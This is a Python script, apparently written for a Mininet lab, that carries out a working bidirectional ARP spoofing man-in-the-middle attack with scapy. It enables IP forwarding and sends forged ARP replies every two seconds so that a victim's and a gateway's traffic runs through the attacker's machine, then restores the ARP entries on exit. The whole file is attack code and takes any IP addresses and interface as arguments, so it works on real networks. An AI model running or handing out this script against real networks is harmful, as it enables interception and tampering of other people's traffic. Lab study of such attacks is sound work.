#!/usr/bin/env python3
"""Bidirectional ARP spoofing helper for the Mininet attacker host."""

import os
import signal
import sys
import time
from datetime import datetime

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp1


RUNNING = True


def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def enable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="utf-8") as handle:
        handle.write("1\n")


def disable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="utf-8") as handle:
        handle.write("0\n")


def resolve_mac(ip_addr, iface):
    ans = srp1(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr),
        iface=iface,
        timeout=2,
        verbose=False,
    )
    if ans is None:
        raise RuntimeError(f"Could not resolve MAC for {ip_addr}")
    return ans.hwsrc


def poison(victim_ip, victim_mac, spoof_ip, attacker_mac, iface, label):
    pkt = Ether(dst=victim_mac) / ARP(
        op=2,
        psrc=spoof_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=attacker_mac,
    )
    sendp(pkt, iface=iface, verbose=False)
    print(f"[{now()}] {label}: {attacker_mac} -> {victim_ip} claims {spoof_ip}")


def restore(victim_ip, victim_mac, true_ip, true_mac, iface, label):
    pkt = Ether(dst=victim_mac) / ARP(
        op=2,
        psrc=true_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=true_mac,
    )
    for _ in range(3):
        sendp(pkt, iface=iface, verbose=False)
    print(f"[{now()}] restore-{label}: {true_mac} -> {victim_ip} restores {true_ip}")


def handle_exit(signum, frame):
    del signum, frame
    global RUNNING
    RUNNING = False


def main():
    if len(sys.argv) != 4:
        print("usage: python3 arp_spoof_attack.py <victim_ip> <gateway_ip> <attacker_interface>")
        sys.exit(1)

    victim_ip, gateway_ip, iface = sys.argv[1:]
    conf.verb = 0

    attacker_mac = get_if_hwaddr(iface)
    victim_mac = resolve_mac(victim_ip, iface)
    gateway_mac = resolve_mac(gateway_ip, iface)

    print(f"[{now()}] victim={victim_ip} victim_mac={victim_mac}")
    print(f"[{now()}] gateway={gateway_ip} gateway_mac={gateway_mac}")
    print(f"[{now()}] attacker_iface={iface} attacker_mac={attacker_mac}")

    enable_ip_forwarding()
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    while RUNNING:
        poison(victim_ip, victim_mac, gateway_ip, attacker_mac, iface, "to-victim")
        poison(gateway_ip, gateway_mac, victim_ip, attacker_mac, iface, "to-gateway")
        time.sleep(2)

    restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, "victim")
    restore(gateway_ip, gateway_mac, victim_ip, victim_mac, iface, "gateway")
    disable_ip_forwarding()


if __name__ == "__main__":
    main()
